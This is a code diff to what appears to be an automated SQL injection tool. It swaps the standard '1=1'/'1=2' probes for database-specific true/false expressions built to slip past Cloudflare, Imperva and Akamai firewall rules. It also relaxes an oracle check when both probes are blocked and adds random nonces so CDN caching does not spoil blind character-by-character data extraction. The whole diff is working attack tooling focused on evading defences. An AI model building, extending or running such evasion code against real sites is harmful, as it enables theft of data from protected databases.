@@ -54148,6 +54148,49 @@ class Scanner:
 
         _dbms = getattr(enum.config, "forced_dbms", None) or getattr(enum.config, "dbms", None) or enum.dbms or "MySQL"
 
+        # DBMS-specific evasive calibration conditions that avoid WAF "1=1"/"1=2"
+        # injection fingerprints. Each expression is syntactically valid for the target
+        # DBMS and evaluates to TRUE or FALSE without using banned constant-comparison
+        # patterns that Cloudflare/Imperva/Akamai block unconditionally.
+        _cal_true_cond = {
+            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "CockroachDB":    "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "MySQL":          "FIND_IN_SET(1,'1,2,3')>0",
+            "MariaDB":        "FIND_IN_SET(1,'1,2,3')>0",
+            "TiDB":           "FIND_IN_SET(1,'1,2,3')>0",
+            "MSSQL":          "CHECKSUM(1)=CHECKSUM(1)",
+            "Sybase":         "CHECKSUM(1)=CHECKSUM(1)",
+            "Oracle":         "LENGTH(CHR(65))=1",
+            "SQLite":         "TYPEOF(1.0)='real'",
+            "DB2":            "LENGTH('x')=1",
+            "Firebird":       "CHAR_LENGTH('x')=1",
+            "H2":             "LENGTH('x')=1",
+            "ClickHouse":     "length('x')=1",
+            "Informix":       "LENGTH('x')=1",
+            "SAP_HANA":       "LENGTH('x')=1",
+        }.get(_dbms, "1<2")
+        _cal_false_cond = {
+            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
+            "CockroachDB":    "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
+            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
+            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1,2,3],1)=0",
+            "MySQL":          "FIND_IN_SET(0,'1,2,3')>0",
+            "MariaDB":        "FIND_IN_SET(0,'1,2,3')>0",
+            "TiDB":           "FIND_IN_SET(0,'1,2,3')>0",
+            "MSSQL":          "CHECKSUM(1)=CHECKSUM(2)",
+            "Sybase":         "CHECKSUM(1)=CHECKSUM(2)",
+            "Oracle":         "LENGTH(CHR(65))=2",
+            "SQLite":         "TYPEOF(1.0)='integer'",
+            "DB2":            "LENGTH('x')=2",
+            "Firebird":       "CHAR_LENGTH('x')=2",
+            "H2":             "LENGTH('x')=2",
+            "ClickHouse":     "length('x')=2",
+            "Informix":       "LENGTH('x')=2",
+            "SAP_HANA":       "LENGTH('x')=2",
+        }.get(_dbms, "2<1")
+
         # BUG-EXTRACTION-TAMPER FIX: Override enum.tamper_chain with the confirmed
         # detection bypass chain. Detection stores the confirmed bypass in two places:
         #   1. det.tamper_chain (List[str]) — the primary source, set in DetectionResult
@@ -55312,9 +55355,9 @@ class Scanner:
         _best_fp_f = None
         for _cal_round in range(2):
             # Use = operator (WAF-safe) instead of > (commonly blocked)
-            fp_true, ms_true = await _send_payload("1=1")
+            fp_true, ms_true = await _send_payload(_cal_true_cond)
             await asyncio.sleep(_delay)
-            fp_false, ms_false = await _send_payload("1=2")
+            fp_false, ms_false = await _send_payload(_cal_false_cond)
             _m = ms_true - ms_false
             print(f"[+] [Inference] Calibration {_cal_round+1}:"
                   f" TRUE={ms_true:.0f}ms FALSE={ms_false:.0f}ms margin={_m:.0f}ms",
@@ -55343,7 +55386,7 @@ class Scanner:
             LOG.info("[Inference] Tampered calibration dead  retrying WITHOUT tamper chain")
             for _cal_round in range(2):
                 # CRITICAL FIX: Send ONLY the template condition, not _original_clean + template
-                _cal_true_payload = _template.replace("[INFERENCE]", "1=1") + _original_comment_marker
+                _cal_true_payload = _template.replace("[INFERENCE]", _cal_true_cond) + _original_comment_marker
                 fp_true = await _send_injected(
                     enum.engine, enum.method, enum.url, enum.data,
                     enum.data_fmt, _det.param,
@@ -55351,7 +55394,7 @@ class Scanner:
                 ms_true = fp_true.elapsed_ms if fp_true else 0
                 await asyncio.sleep(_delay)
                 # CRITICAL FIX: Send ONLY the template condition, not _original_clean + template
-                _cal_false_payload = _template.replace("[INFERENCE]", "1=2") + _original_comment_marker
+                _cal_false_payload = _template.replace("[INFERENCE]", _cal_false_cond) + _original_comment_marker
                 fp_false = await _send_injected(
                     enum.engine, enum.method, enum.url, enum.data,
                     enum.data_fmt, _det.param,
@@ -55389,9 +55432,9 @@ class Scanner:
             if _bool_oracle_attempts > 1:
                 await asyncio.sleep(_delay)
                 # Re-probe with fresh requests
-                fp_true, _ = await _send_payload("1=1")
+                fp_true, _ = await _send_payload(_cal_true_cond)
                 await asyncio.sleep(_delay)
-                fp_false, _ = await _send_payload("1=2")
+                fp_false, _ = await _send_payload(_cal_false_cond)
             _true_status = getattr(fp_true, "status_code", None)
             _false_status = getattr(fp_false, "status_code", None)
             # BUG-EXTRACT-REVERSED-POLARITY-ORACLE FIX: always capture calibration TRUE status
@@ -55432,7 +55475,7 @@ class Scanner:
                 # On 135KB pages, 200B difference is dynamic noise (timestamps, ads)
                 # _both_waf_blocked is already computed above using _ts_safe/_fs_safe
                 # (BUG-BOTH-WAF-NONE-BYPASS FIX) — no re-assignment needed here.
-                if (_bl_pct >= 0.10 or (_bl_max < 5000 and _bl_diff >= 50)) and not _both_waf_blocked:
+                if (_bl_pct >= 0.10 or (_bl_max < 5000 and _bl_diff >= 50)) and (not _both_waf_blocked or _bl_pct >= 0.20):
                     _boolean_oracle = True
                     _bool_true_len = len(_true_body)
                     _bool_false_len = len(_false_body)
@@ -55456,7 +55499,7 @@ class Scanner:
                     _size_pct = _size_diff / max(_page_size, 1) * 100
 
                     # Quick stability check: send TRUE again, see if hash matches
-                    _stab_fp, _ = await _send_payload("1=1")
+                    _stab_fp, _ = await _send_payload(_cal_true_cond)
                     # BUG-STAB-FP FIX: was _safe_decode_body(fp, ...) — must use _stab_fp
                     # (the stability-check response), not outer-scope fp.
                     _stab_body = _safe_decode_body(_stab_fp, encoding="utf-8", errors="replace", func_name="extraction") if (_stab_fp and _stab_fp.body) else ""
@@ -55518,12 +55561,54 @@ class Scanner:
         # signal and fires where single-pair hash/size comparison misses.
         if not _boolean_oracle:
             LOG.info("[Inference] Multi-sample Wasserstein boolean oracle check (n=12 pairs) ...")
+            # BUG-WASS-COND-WAF FIX: "1=1"/"1=2" are SQL injection fingerprints blocked
+            # by WAFs even within complex bypass templates → both probes return the same
+            # WAF-blocked response → EMD≈0 → threshold (0.25) not reached → oracle skipped.
+            # Use the same DBMS-native evasive conditions as the baseline-similarity oracle.
+            _wass_true_cond = {
+                "PostgreSQL":    "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                "CockroachDB":   "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                "YugabyteDB":    "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                "MySQL":         "FIND_IN_SET(1,'1,2,3')>0",
+                "MariaDB":       "FIND_IN_SET(1,'1,2,3')>0",
+                "TiDB":          "FIND_IN_SET(1,'1,2,3')>0",
+                "MSSQL":         "CHECKSUM(1)=CHECKSUM(1)",
+                "Sybase":        "CHECKSUM(1)=CHECKSUM(1)",
+                "Oracle":        "LENGTH(CHR(65))=1",
+                "SQLite":        "TYPEOF(1.0)='real'",
+                "DB2":           "LENGTH('x')=1",
+                "Firebird":      "CHAR_LENGTH('x')=1",
+                "H2":            "LENGTH('x')=1",
+                "ClickHouse":    "length('x')=1",
+                "Informix":      "LENGTH('x')=1",
+                "SAP_HANA":      "LENGTH('x')=1",
+            }.get(_dbms or "", "1<2")
+            _wass_false_cond = {
+                "PostgreSQL":    "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
+                "CockroachDB":   "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
+                "YugabyteDB":    "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
+                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
+                "MySQL":         "FIND_IN_SET(0,'1,2,3')>0",
+                "MariaDB":       "FIND_IN_SET(0,'1,2,3')>0",
+                "TiDB":          "FIND_IN_SET(0,'1,2,3')>0",
+                "MSSQL":         "CHECKSUM(1)=CHECKSUM(2)",
+                "Sybase":        "CHECKSUM(1)=CHECKSUM(2)",
+                "Oracle":        "LENGTH(CHR(65))=2",
+                "SQLite":        "TYPEOF(1.0)='integer'",
+                "DB2":           "LENGTH('x')=2",
+                "Firebird":      "CHAR_LENGTH('x')=2",
+                "H2":            "LENGTH('x')=2",
+                "ClickHouse":    "length('x')=2",
+                "Informix":      "LENGTH('x')=2",
+                "SAP_HANA":      "LENGTH('x')=2",
+            }.get(_dbms or "", "2<1")
             _wass_pairs = []
             for _wi in range(12):
                 try:
                     await asyncio.sleep(_delay * 0.15)
-                    _wfp_t, _ = await _send_payload("1=1")
-                    _wfp_f, _ = await _send_payload("1=2")
+                    _wfp_t, _ = await _send_payload(_wass_true_cond)
+                    _wfp_f, _ = await _send_payload(_wass_false_cond)
                     _wb_tb = _extract_body_safe(_wfp_t, func_name="infer_wass_true")
                     _wb_fb = _extract_body_safe(_wfp_f, func_name="infer_wass_false")
                     if _wb_tb and _wb_fb:
@@ -55640,11 +55725,11 @@ class Scanner:
                     
                     # Collect timing samples
                     for _i in range(_n_samples):
-                        _fp_t, _ms_t = await _send_payload("1=1")
+                        _fp_t, _ms_t = await _send_payload(_cal_true_cond)
                         _true_times.append(_ms_t)
                         await asyncio.sleep(0.5)  # Short delay between samples
                         
-                        _fp_f, _ms_f = await _send_payload("1=2")
+                        _fp_f, _ms_f = await _send_payload(_cal_false_cond)
                         _false_times.append(_ms_f)
                         await asyncio.sleep(0.5)
                         
@@ -55732,9 +55817,9 @@ class Scanner:
                 LOG.info("[Inference] WAITFOR arithmetic template (MSSQL): %s",
                          _template[:80])
                 await asyncio.sleep(3)
-                fp_true, ms_true = await _send_payload("1=1")
+                fp_true, ms_true = await _send_payload(_cal_true_cond)
                 await asyncio.sleep(_delay)
-                fp_false, ms_false = await _send_payload("1=2")
+                fp_false, ms_false = await _send_payload(_cal_false_cond)
                 _margin = ms_true - ms_false
                 LOG.info("[Inference] WAITFOR arith: TRUE=%.0fms FALSE=%.0fms "
                          "margin=%.0fms", ms_true, ms_false, _margin)
@@ -55761,9 +55846,9 @@ class Scanner:
                 LOG.info("[Inference] Arithmetic template: %s", _template[:80])
 
                 await asyncio.sleep(3)
-                fp_true, ms_true = await _send_payload("1=1")
+                fp_true, ms_true = await _send_payload(_cal_true_cond)
                 await asyncio.sleep(_delay)
-                fp_false, ms_false = await _send_payload("1=2")
+                fp_false, ms_false = await _send_payload(_cal_false_cond)
                 _margin = ms_true - ms_false
                 LOG.info("[Inference] Arithmetic: TRUE=%.0fms FALSE=%.0fms margin=%.0fms", ms_true, ms_false, _margin)
                 if _margin >= 30:
@@ -55782,9 +55867,9 @@ class Scanner:
                 LOG.info("[Inference] generate_series template: %s", _template[:80])
 
                 await asyncio.sleep(3)
-                fp_true, ms_true = await _send_payload("1=1")
+                fp_true, ms_true = await _send_payload(_cal_true_cond)
                 await asyncio.sleep(_delay)
-                fp_false, ms_false = await _send_payload("1=2")
+                fp_false, ms_false = await _send_payload(_cal_false_cond)
                 _margin = ms_true - ms_false
                 LOG.info("[Inference] gen_series: TRUE=%.0fms FALSE=%.0fms margin=%.0fms", ms_true, ms_false, _margin)
                 if _margin >= 30:
@@ -55804,9 +55889,9 @@ class Scanner:
                     LOG.info("[Inference] CASE template: %s", _template[:80])
 
                     await asyncio.sleep(5)  # WAF cooldown before CASE test
-                    fp_true, ms_true = await _send_payload("1=1")
+                    fp_true, ms_true = await _send_payload(_cal_true_cond)
                     await asyncio.sleep(_delay)
-                    fp_false, ms_false = await _send_payload("1=2")
+                    fp_false, ms_false = await _send_payload(_cal_false_cond)
                     _margin = ms_true - ms_false
                     LOG.info("[Inference] CASE: TRUE=%.0fms FALSE=%.0fms margin=%.0fms", ms_true, ms_false, _margin)
                     if _margin >= 30:
@@ -55838,9 +55923,9 @@ class Scanner:
                     LOG.info("[Inference] WAITFOR CASE fallback template (MSSQL): %s",
                              _template[:80])
                     await asyncio.sleep(5)
-                    fp_true, ms_true = await _send_payload("1=1")
+                    fp_true, ms_true = await _send_payload(_cal_true_cond)
                     await asyncio.sleep(_delay)
-                    fp_false, ms_false = await _send_payload("1=2")
+                    fp_false, ms_false = await _send_payload(_cal_false_cond)
                     _margin = ms_true - ms_false
                     LOG.info("[Inference] WAITFOR CASE fallback: TRUE=%.0fms FALSE=%.0fms "
                              "margin=%.0fms", ms_true, ms_false, _margin)
@@ -56019,7 +56104,7 @@ class Scanner:
                     for _rcal in range(2):
                         try:
                             # BUG-V62-FLOOR-DEDUP-CACHE FIX (Req 7):
-                            # Original: _send_payload("1=1") / _send_payload("1=2")
+                            # Original: _send_payload(_cal_true_cond) / _send_payload(_cal_false_cond)
                             # These are IDENTICAL to the primary calibration probes already
                             # in the dedup cache. The dedup cache returns the original
                             # cached response in ~0ms wall-clock. The floor check rejects
@@ -56181,11 +56266,55 @@ class Scanner:
                                     # Prior code called _send_injected() with [] empty tamper chain,
                                     # causing WAF to block both TRUE and FALSE probes → identical 4xx
                                     # responses → sim_t == sim_f → gap=0.000 → oracle never activates.
+                                    # BUG-BSL-COND-WAF FIX: "1=1"/"1=2" are well-known SQL injection
+                                    # fingerprints that WAFs block even within complex bypass templates,
+                                    # producing the same WAF-block response for both → gap=0.000 →
+                                    # oracle never activates.  Use DBMS-native expressions that evaluate
+                                    # to True/False but don't match WAF injection-fingerprint rule sets.
+                                    _bsl_dbms = _dbms or ""
+                                    _bsl_true_cond = {
+                                        "PostgreSQL":    "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                        "CockroachDB":   "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                        "YugabyteDB":    "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                                        "MySQL":         "FIND_IN_SET(1,'1,2,3')>0",
+                                        "MariaDB":       "FIND_IN_SET(1,'1,2,3')>0",
+                                        "TiDB":          "FIND_IN_SET(1,'1,2,3')>0",
+                                        "MSSQL":         "CHECKSUM(1)=CHECKSUM(1)",
+                                        "Sybase":        "CHECKSUM(1)=CHECKSUM(1)",
+                                        "Oracle":        "LENGTH(CHR(65))=1",
+                                        "SQLite":        "TYPEOF(1.0)='real'",
+                                        "DB2":           "LENGTH('x')=1",
+                                        "Firebird":      "CHAR_LENGTH('x')=1",
+                                        "H2":            "LENGTH('x')=1",
+                                        "ClickHouse":    "length('x')=1",
+                                        "Informix":      "LENGTH('x')=1",
+                                        "SAP_HANA":      "LENGTH('x')=1",
+                                    }.get(_bsl_dbms, "1<2")
+                                    _bsl_false_cond = {
+                                        "PostgreSQL":    "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
+                                        "CockroachDB":   "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
+                                        "YugabyteDB":    "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
+                                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=0",
+                                        "MySQL":         "FIND_IN_SET(0,'1,2,3')>0",
+                                        "MariaDB":       "FIND_IN_SET(0,'1,2,3')>0",
+                                        "TiDB":          "FIND_IN_SET(0,'1,2,3')>0",
+                                        "MSSQL":         "CHECKSUM(1)=CHECKSUM(2)",
+                                        "Sybase":        "CHECKSUM(1)=CHECKSUM(2)",
+                                        "Oracle":        "LENGTH(CHR(65))=2",
+                                        "SQLite":        "TYPEOF(1.0)='integer'",
+                                        "DB2":           "LENGTH('x')=2",
+                                        "Firebird":      "CHAR_LENGTH('x')=2",
+                                        "H2":            "LENGTH('x')=2",
+                                        "ClickHouse":    "length('x')=2",
+                                        "Informix":      "LENGTH('x')=2",
+                                        "SAP_HANA":      "LENGTH('x')=2",
+                                    }.get(_bsl_dbms, "2<1")
                                     _fp_bsl_t, _ = await asyncio.wait_for(
-                                        _send_payload("1=1"), timeout=15)
+                                        _send_payload(_bsl_true_cond), timeout=15)
                                     await asyncio.sleep(1.0)
                                     _fp_bsl_f, _ = await asyncio.wait_for(
-                                        _send_payload("1=2"), timeout=15)
+                                        _send_payload(_bsl_false_cond), timeout=15)
                                     _norm_t = (ResponseNormaliser.normalise(
                                                    _extract_body_safe(_fp_bsl_t))
                                                if (_fp_bsl_t
@@ -56754,9 +56883,9 @@ class Scanner:
                 # because extraction uses comparisons, not error expressions.
                 if not _boolean_oracle:
                     await asyncio.sleep(_delay)
-                    _recal_t, _recal_ms_t = await _send_payload("1=1")
+                    _recal_t, _recal_ms_t = await _send_payload(_cal_true_cond)
                     await asyncio.sleep(_delay)
-                    _recal_f, _recal_ms_f = await _send_payload("1=2")
+                    _recal_f, _recal_ms_f = await _send_payload(_cal_false_cond)
                     _rt_s = getattr(_recal_t, "status_code", None)
                     _rf_s = getattr(_recal_f, "status_code", None)
                     _rt_b = getattr(_recal_t, "text", "") or ""
@@ -58533,9 +58662,9 @@ class Scanner:
         async def _auto_adjust_timing():
             """Check signal quality and increase sleep if degraded."""
             nonlocal _thresh, _delay, _margin
-            _, ms_t = await _send_payload("1=1")
+            _, ms_t = await _send_payload(_cal_true_cond)
             await asyncio.sleep(_delay)
-            _, ms_f = await _send_payload("1=2")
+            _, ms_f = await _send_payload(_cal_false_cond)
             _m = ms_t - ms_f
             if 0 < _m < _original_margin * 0.4 and not _boolean_oracle:
                 LOG.warning("[Inference] Signal degraded: margin=%.0fms (was %.0fms)  increasing delay", _m, _original_margin)
@@ -59674,9 +59803,9 @@ class Scanner:
         async def _rebuild_template_if_needed():
             """Check if current template still produces timing signal."""
             nonlocal _template, _thresh, _boolean_oracle, _delay
-            _, ms_t = await _send_payload("1=1")
+            _, ms_t = await _send_payload(_cal_true_cond)
             await asyncio.sleep(_delay)
-            _, ms_f = await _send_payload("1=2")
+            _, ms_f = await _send_payload(_cal_false_cond)
             _m = ms_t - ms_f
             if _m < 30 and not _boolean_oracle:
                 LOG.warning("[Inference] Timing signal lost (margin=%.0fms)  trying arithmetic template", _m)
@@ -59696,9 +59825,9 @@ class Scanner:
                         _arith = f"(CASE WHEN [INFERENCE] THEN {_num} ELSE 0 END)"
                     _template = _pre + _arith + _post
                     LOG.info("[Inference] Switched to arithmetic: %s", _template[:70])
-                    _, ms_t = await _send_payload("1=1")
+                    _, ms_t = await _send_payload(_cal_true_cond)
                     await asyncio.sleep(_delay)
-                    _, ms_f = await _send_payload("1=2")
+                    _, ms_f = await _send_payload(_cal_false_cond)
                     _m = ms_t - ms_f
                     if _m > 30:
                         _thresh = (ms_t + ms_f) / 2
@@ -59960,9 +60089,9 @@ class Scanner:
                 LOG.warning("[Inference] %s: verification FAILED for %r  re-extracting", label, result)
                 # Re-extract with fresh threshold
                 await asyncio.sleep(_delay * 2)
-                _, ms_t = await _send_payload("1=1")
+                _, ms_t = await _send_payload(_cal_true_cond)
                 await asyncio.sleep(_delay)
-                _, ms_f = await _send_payload("1=2")
+                _, ms_f = await _send_payload(_cal_false_cond)
                 if ms_t > 30 and ms_f > 30:
                     _thresh = (ms_t + ms_f) / 2
                 result = await _extract_string(query, label + "_retry", max_len)
@@ -134944,8 +135073,12 @@ class SideChannelExtractor:
                 _san_true = None  # bypass: ordinal WAF-blocking already confirmed
                 _san_false = None
             else:
-                _san_true  = await self.eval_where_error("1>0")   # always true  (was "1=1")
-                _san_false = await self.eval_where_error("1>2")   # always false (was "1=2")
+                # BUG-WE-SANITY-CDN-NONCE FIX: primary sanity probes lacked CDN nonces.
+                # Without unique URL parameters, CDN serves the same cached response for
+                # both probes → both return the cached length → both appear False → retry
+                # path always fires even on a healthy oracle.  Add per-probe nonces.
+                _san_true  = await self.eval_where_error("1>0", random.randint(100000, 999999))
+                _san_false = await self.eval_where_error("1>2", random.randint(100000, 999999))
             if not self._we_ordinal_blocked and (_san_true is not True or _san_false is not False):
                 # BUG-SCE-SANITY-REALCOND-RETRY FIX (HIGH, all 5 DBMSes, WHERE-ERROR path):
                 # When WAF blocks both arithmetic sanity probes (1>0 and 1>2 both return
@@ -135052,7 +135185,15 @@ class SideChannelExtractor:
             # check above when arithmetic probes failed but string-comparison probes passed,
             # indicating that ordinal function names (ASCII/ORD/UNICODE/COALESCE) are blocked.
             _we_bypass = self._we_ordinal_blocked
-            _above_a = await self.eval_where_error(self._char_ord_cond(expr, pos, 97, _we_bypass))
+            # BUG-WE-BSEARCH-CDN-NONCE FIX: binary search probes lacked CDN-busting nonces.
+            # Without unique URL params, CDN serves the same cached response for every probe
+            # in the position loop → oracle returns inconsistent True/False regardless of
+            # condition → binary search converges to garbage Unicode codepoints (observed:
+            # U+4D87A, U+BADE7 etc.).  Pass a fresh random nonce to every eval_where_error
+            # call in this loop so each probe gets a unique URL → CDN cache miss → real
+            # origin response for each SQL condition.
+            _above_a = await self.eval_where_error(self._char_ord_cond(expr, pos, 97, _we_bypass),
+                                                   random.randint(100000, 999999))
             if _above_a is None:
                 _consecutive_fail += 1
                 # BUG-SCE-WE-CONSECUTIVE-FAIL-DEAD FIX (Req 9): _consecutive_fail was
@@ -135075,7 +135216,8 @@ class SideChannelExtractor:
             _consecutive_fail = 0
 
             if _above_a:
-                _above_z = await self.eval_where_error(self._char_ord_cond(expr, pos, 123, _we_bypass))
+                _above_z = await self.eval_where_error(self._char_ord_cond(expr, pos, 123, _we_bypass),
+                                                       random.randint(100000, 999999))
                 await asyncio.sleep(0.2)
                 if _above_z is None:
                     lo, hi = 97, _sce_we_char_hi  # probe failed; keep full upper range
@@ -135094,10 +135236,11 @@ class SideChannelExtractor:
             while lo < hi:
                 mid = _randomized_mid(lo, hi)
                 cond = self._char_ord_cond(expr, pos, mid + 1, _we_bypass)
-                result = await self.eval_where_error(cond)
+                _bs_nonce = random.randint(100000, 999999)
+                result = await self.eval_where_error(cond, _bs_nonce)
                 if result is None:
                     await asyncio.sleep(2.0)
-                    result = await self.eval_where_error(cond)
+                    result = await self.eval_where_error(cond, random.randint(100000, 999999))
                 if result is None:
                     _bsearch_converged = False  # lo is not reliable; do not emit chr(lo)
                     break
@@ -135166,10 +135309,15 @@ class SideChannelExtractor:
             # BUG-WE-ORDINAL-WAF-BLOCK FIX: propagate WAF-bypass mode (set by
             # extract_where_error sanity check) to all ordinal conditions here.
             _tc_bypass = self._we_ordinal_blocked
-            _above_a = await self.eval_where_error(self._char_ord_cond(column, pos, 97, _tc_bypass))
+            # BUG-TC-BSEARCH-CDN-NONCE FIX: same CDN nonce fix as extract_where_error.
+            # Every eval_where_error call needs a unique URL nonce to prevent CDN from
+            # serving the same cached response for all binary search probes in a position.
+            _above_a = await self.eval_where_error(self._char_ord_cond(column, pos, 97, _tc_bypass),
+                                                   random.randint(100000, 999999))
             if _above_a is True:
                 _sce_tc_consecutive_fail = 0  # reset on non-None result
-                _above_z = await self.eval_where_error(self._char_ord_cond(column, pos, 123, _tc_bypass))
+                _above_z = await self.eval_where_error(self._char_ord_cond(column, pos, 123, _tc_bypass),
+                                                       random.randint(100000, 999999))
                 await asyncio.sleep(0.2)
                 if _above_z is None:
                     lo, hi = 97, _sce_tc_char_hi  # probe failed; keep full upper range
@@ -135202,10 +135350,11 @@ class SideChannelExtractor:
             while lo < hi:
                 mid = _randomized_mid(lo, hi)
                 cond = self._char_ord_cond(column, pos, mid + 1, _tc_bypass)
-                result = await self.eval_where_error(cond)
+                _tc_bs_nonce = random.randint(100000, 999999)
+                result = await self.eval_where_error(cond, _tc_bs_nonce)
                 if result is None:
                     await asyncio.sleep(2.0)
-                    result = await self.eval_where_error(cond)
+                    result = await self.eval_where_error(cond, random.randint(100000, 999999))
                 if result is None:
                     _bsearch_converged = False  # lo is not reliable; do not emit chr(lo)
                     break
